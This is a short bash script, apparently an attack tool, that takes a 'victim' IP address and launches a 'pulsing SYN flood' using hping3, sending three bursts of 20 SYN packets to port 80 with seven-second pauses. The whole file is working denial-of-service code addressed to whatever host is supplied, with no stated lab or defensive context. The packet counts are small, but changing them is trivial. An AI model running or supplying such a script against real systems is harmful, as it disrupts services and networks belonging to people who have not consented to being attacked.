#!/bin/bash

VICTIM_IP=$1

if [ -z "$VICTIM_IP" ]; then
    echo "Usage: $0 <victim_ip>"
    exit 1
fi

echo "--- Starting Pulsing SYN Flood against $VICTIM_IP ---"

for i in {1..3}
do
    echo ">>> Pulse $i of 3: Sending 20 SYN packets..."
    # -S for SYN, -c 20 for count, -p 80 for port
    hping3 -S -c 20 -p 80 $VICTIM_IP > /dev/null 2>&1

    if [ $i -lt 3 ]; then
        echo ">>> Pausing for 7 seconds..."
        sleep 7
    fi
done

echo "--- Pulsing Attack Finished ---"